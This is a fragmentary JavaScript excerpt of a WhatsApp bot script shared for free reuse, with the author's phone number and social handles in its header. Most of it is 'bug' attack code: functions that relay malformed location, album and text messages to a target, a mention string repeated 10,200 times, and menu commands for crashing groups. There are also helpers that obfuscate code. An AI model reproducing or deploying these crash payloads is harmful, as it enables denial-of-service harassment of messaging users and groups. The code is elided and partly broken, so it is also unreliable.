//base by its_sayan-j3p (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @its_sayan-j3p
//Instagram: unicorn_xeon13
//Telegram: @its_sayan-j3p
//GitHub: @its_sayan-j3p
//WhatsApp: +2347041969676
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@its_sayan-j3p
...
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @nottyxsayan") + "\n\n\n";
    jidds = [];
    xeontex += "*~@2347041969676~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);
    jidds.push("2347041969676@s.whatsapp.net", "919366316018@s.whatsapp.net");
//bug database
...
newsletterJid: "120363417044943594@newsletter",
},
externalAdReply: {
			...
			await XeonBotInc.relayMessage(X, {
					"extendedTextMessage": {
						...
						"contextInfo": {
							...
							"placeholderKey": {
								"remoteJid": "2347041969676@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
...
async function xoutios(target) {
    ...
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            ...
            name: xeonIpong,
            url: "https://youtube.com/@its_sayan-j3p"
        }
    ...
    locationMessage: {
        ...
        contextInfo: {
            ...
            externalAdReply: {
                ...
                thumbnail: m,
                jpegThumbnail: m,
                mediaUrl: `https://www.youtube.com/@its_sayan-j3p`,
                sourceUrl: `https://www.youtube.com/@its_sayan-j3p`
            }
        }
    }
}, {});
...
async function albumbuggers1(target, mention) {
  ...
  const imageCrash = "https://files.catbox.moe/9b4edn.jpg;
...
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/its_sayan-j3p`
}
}
}, {})
}
...
await XeonBotInc.sendMessage(target, {
    text: 'its_sayan-j3p_prindapan_boy',
    contextInfo: {
...
╰┈➤ ɢʀᴏᴜᴘ ʙᴜɢ
> *_sayngroup groupid_*
> *_saynsucidegc groupid_*
> *_sayngroupios groupid_*
> *_saynmixgc groupid_*
> *_saynbetagc groupid_*
...
if (q.includes('its_sayan-j3p.shop')){
...
const optionsObf6 = {
  ...
  identifierGenerator: function () {
            ...
            const filePath = './enc_by_@its_sayan-j3p.js';
            ...
            await XeonBotInc.sendMessage(m.chat, {
                ...
                fileName: 'Encrypted By @its_sayan-j3p.js'
            }, { quoted: m });
...
const filePath = './dec_by_@its_sayan-j3p.js';
...
mimetype: 'application/javascript',
fileName: 'Decrypted By @its_sayan-j3p'
}, {quoted: m});
...
"sourceUrl": `https://youtube.com/@its_sayan-j3p`
}}}, { quoted: m })
...
break;
  ...
  XeonBotInc.sendMessage(m.chat, {
    ...
    contextInfo: {
      ...
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363417044943594@newsletter", // Use the newsletterJid here
        newsletterName: `ok`
      }
    }
  }, {quoted:m});
